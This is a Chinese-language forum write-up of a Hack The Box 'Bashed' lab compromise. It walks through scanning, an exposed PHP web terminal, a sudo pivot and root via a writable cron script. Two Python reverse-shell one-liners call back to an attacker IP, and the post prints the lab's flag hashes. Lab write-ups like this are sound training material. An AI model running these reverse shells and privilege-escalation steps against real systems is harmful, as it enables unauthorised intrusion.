---
title: "HTB Bashed 渗透测试详细记录"
source: "https://linux.do/t/topic/604724"
author:
  - "[[user792]]"
published: 2026-05-09
created: 2026-05-09
---
不许夹我 ![[74d5cbc6b7c465d34809434c169be714_MD5.png]] 
夹我是小狗

坚持三天了，是不是应该点点赞呢？

- Irked [HTB Irked - 渗透测试详细记录](https://linux.do/t/topic/599663) ![[23f3116a4a90d26fd240322f4039cbb8_MD5.png]]2025-04-26
- Popcorn [HTB Popcorn 渗透测试详细记录](https://linux.do/t/topic/601595) ![[23f3116a4a90d26fd240322f4039cbb8_MD5.png]]2025-04-27
- Bashed [HTB Bashed 渗透测试详细记录](https://linux.do/t/topic/604724) ![[23f3116a4a90d26fd240322f4039cbb8_MD5.png]]2025-04-28  
	抨击 HTB 抨击渗透测试记录 ![[23f3116a4a90d26fd240322f4039cbb8_MD5.png]]2025-04-28

以下是正文

# HTB Bashed 渗透测试详细记录

## 摘要

本文详细记录了对 HTB Bashed 的完整渗透测试过程。通过初始侦察发现目标只开放了80端口的HTTP服务，进一步探测发现了一个可直接执行代码的PHP终端。利用这一入口点获取了初始shell权限，随后通过发现的定时任务执行脚本成功提升至root权限。整个渗透过程展示了从发现、利用到提权的完整攻击链路。

## 关键技术

- Web应用漏洞利用 (PHP远程代码执行)
- 提权 (定时任务利用)

## 1\. 初始侦察阶段

首先使用Nmap进行全端口扫描，确定目标开放的服务：

```bash
nmap -sT -min-rate 10000 -p- 10.10.10.68
```

参数说明：

- `-sT`: 使用TCP连接扫描，建立完整的三次握手
- `-min-rate 10000`: 设置扫描速率不低于每秒10000个包，加快扫描速度
- `-p-`: 扫描所有端口范围（1-65535）
- `10.10.10.68`: 目标IP地址

扫描结果显示只有80端口开放：

```bash
PORT   STATE SERVICE
80/tcp open  http
```

随后对80端口进行更详细的服务版本探测：

```bash
nmap -sT -sCV -p 80 10.10.10.68
```

参数说明：

- `-sT`: TCP连接扫描
- `-sCV`: 组合参数，包含`-sC`（使用默认脚本）和`-sV`（版本探测）
- `-p 80`: 仅扫描80端口
- `10.10.10.68`: 目标IP地址

扫描结果：

```swift
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Arrexel's Development Site
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.85 seconds
```

## 2\. 服务探测与信息收集

基于前期扫描结果，对HTTP服务进行进一步的目录遍历，寻找可能存在的隐藏资源：

```bash
feroxbuster -u http://10.10.10.68/ --methods GET,POST
```

参数说明：

- `-u http://10.10.10.68/`: 指定目标URL
- `--methods GET,POST`: 指定使用GET和POST方法进行检测

通过目录遍历，发现了一个关键入口点：`http://10.10.10.68/dev/phpbash.min.php`，这是一个可以直接在网页上执行代码的PHP终端。

[![[38c8c8ffaa03ac5c1743729032f9b4a4_MD5.png]]

PHP终端界面1533×682 26.9 KB

](https://cdn3.ldstatic.com/original/4X/0/5/a/05a6bb547770f4c45eb3b0db8ec71796c48b7574.png "PHP终端界面")

## 3\. 漏洞识别与初始访问

发现该PHP终端可以执行系统命令，构造反弹Shell payload以获取交互式shell。首先在本地攻击机器上设置监听：

```bash
nc -lvnp 9999
```

参数说明：

- `-l`: 设置为监听模式
- `-v`: 显示详细信息
- `-n`: 不进行DNS解析
- `-p 9999`: 监听9999端口

在PHP终端执行Python反弹Shell代码：

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.26",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

此代码创建了一个socket连接到攻击者机器的9999端口，并将标准输入/输出/错误重定向到这个连接，最后启动交互式shell。

成功获取到目标主机的shell：

```sql
listening on [any] 9999 ...
connect to [10.10.16.26] from (UNKNOWN) [10.10.10.68] 48456
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 4\. 横向移动

成功获取初始shell后，开始收集系统信息并寻找可能的横向移动路径。首先检查当前用户权限：

```bash
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

成功getkey1  成功 getkey1

```bash
$ ls 
arrexel
scriptmanager
$ cd arrexel
$ ls
user.txt
$ cat user.txt
a4db45112116c5557e631bd9810a09e3
```

## 5\. 权限提升前的信息收集

检查当前用户的sudo权限：

```bash
sudo -l
```

执行结果：

```ruby
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

输出显示www-data有权限以"scriptmanager"用户的身份运行命令，"NOPASSWD: ALL"表示www-data可以不需要输入密码就能以scriptmanager身份运行任何命令。

利用这一特权进行用户切换：

```bash
sudo -u scriptmanager /bin/bash
```

优化获取到的shell，提升交互体验：

```bash
script /dev/null -c bash
```

检查系统内核版本

```bash
uname -a
Linux bashed 4.4.0-62-generic #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
```

经检查，该内核版本不存在脏牛(Dirty COW)提权漏洞。

浏览系统根目录，发现特殊目录：

```bash
ls -al
```

输出结果（部分）：

```
total 92
drwxr-xr-x  23 root          root           4096 Jun  2  2022 .
drwxr-xr-x  23 root          root           4096 Jun  2  2022 ..
-rw-------   1 root          root            174 Jun 14  2022 .bash_history
drwxr-xr-x   2 root          root           4096 Jun  2  2022 bin
drwxr-xr-x   3 root          root           4096 Jun  2  2022 boot
drwxr-xr-x  19 root          root           4140 Apr 27 05:30 dev
drwxr-xr-x  89 root          root           4096 Jun  2  2022 etc
drwxr-xr-x   4 root          root           4096 Dec  4  2017 home
lrwxrwxrwx   1 root          root             32 Dec  4  2017 initrd.img -> boot/initrd.img-4.4.0-62-generic
drwxr-xr-x  19 root          root           4096 Dec  4  2017 lib
drwxr-xr-x   2 root          root           4096 Jun  2  2022 lib64
drwx------   2 root          root          16384 Dec  4  2017 lost+found
drwxr-xr-x   4 root          root           4096 Dec  4  2017 media
drwxr-xr-x   2 root          root           4096 Jun  2  2022 mnt
drwxr-xr-x   2 root          root           4096 Dec  4  2017 opt
dr-xr-xr-x 175 root          root              0 Apr 27 05:30 proc
drwx------   3 root          root           4096 Apr 27 05:32 root
drwxr-xr-x  18 root          root            520 Apr 27 06:25 run
drwxr-xr-x   2 root          root           4096 Dec  4  2017 sbin
drwxrwxr--   2 scriptmanager scriptmanager  4096 Jun  2  2022 scripts
drwxr-xr-x   2 root          root           4096 Feb 15  2017 srv
dr-xr-xr-x  13 root          root              0 Apr 27 05:30 sys
drwxrwxrwt  10 root          root           4096 Apr 27 10:50 tmp
drwxr-xr-x  10 root          root           4096 Dec  4  2017 usr
drwxr-xr-x  12 root          root           4096 Jun  2  2022 var
lrwxrwxrwx   1 root          root             29 Dec  4  2017 vmlinuz -> boot/vmlinuz-4.4.0-62-generic
```

注意到存在一个由scriptmanager用户所有的scripts目录

## 6\. 权限提升

进入scripts目录检查内容：

```bash
cd scripts
ls -al
```

输出结果：

```css
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Jun  2  2022 .
drwxr-xr-x 23 root          root          4096 Jun  2  2022 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Apr 27 10:51 test.txt
```

发现关键信息：text.txt的文件时间很新，而且还是root权限，可能是某种周期任务生成的

查看test.py脚本内容：

```bash
cat test.py
```

输出结果：

```python
f = open("test.txt", "w")
f.write("testing 123!")
f.close
```

分析发现，test.txt是由test.py生成的，而生成的文件拥有root权限，这表明系统中存在定时任务以root身份周期性执行test.py脚本。

由于当前用户(scriptmanager)对test.py有修改权限，可以修改脚本内容来获取root权限。替换test.py的内容为反弹shell代码：

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.26",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

在本地攻击机器设置新的监听：

```bash
nc -lvnp 8888
```

等待定时任务执行修改后的脚本，成功获取root权限shell：

```makefile
connect to [10.10.16.26] from (UNKNOWN) [10.10.10.68] 50278
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

获取root权限后，读取最终目标文件：

```bash
# cat /root/root.txt
668ee4c37ea62443a557eedaea6bf212
```

[![[68fa60e90d2863025ab7c2d9dd4ef8a6_MD5.png]]

Root权限证明694×639 97.7 KB

](https://cdn3.ldstatic.com/original/4X/d/0/d/d0da828d1fec820ed5fd7ee2fb2b24d494c35b78.png "Root权限证明")

## 7\. 总结

### 安全漏洞列表

1. **不安全的Web配置** - 在开发目录中暴露了具有代码执行功能的PHP终端
2. **不当的权限配置** - www-data用户被允许无密码执行scriptmanager用户的命令
3. **不安全的定时任务实现** - root用户定时执行一个低权限用户可修改的脚本

### 完整攻击链路图

```bash
端口扫描 → 发现Web服务 → 目录遍历 → 发现PHP终端 → 远程代码执行获取www-data权限 → 利用sudo权限提升至scriptmanager → 发现并修改定时执行的脚本 → 获取root权限
```

### 各阶段关键点总结

1. **侦察阶段**：通过Nmap确定开放端口和服务，仅发现80端口HTTP服务。
2. **信息收集**：使用Feroxbuster对Web目录进行枚举，发现关键入口点phpbash.min.php。
3. **初始访问**：利用PHP终端执行反弹Shell代码，获取www-data用户权限。
4. 权限提升：
	- 第一阶段：利用sudo配置从www-data提升至scriptmanager用户。
		- 第二阶段：通过修改root定时任务执行的脚本获取最高权限。

### 攻击向量简明展示

1. **初始入口点**：`http://10.10.10.68/dev/phpbash.min.php`
2. 提权路径：
	- www-data → scriptmanager：`sudo -u scriptmanager /bin/bash`
		- scriptmanager → root：修改定时执行脚本`/scripts/test.py`

## 结束语

此次打靶练习展示了我是如何通过一系列连贯的步骤，从发现web应用漏洞到最终获取系统root权限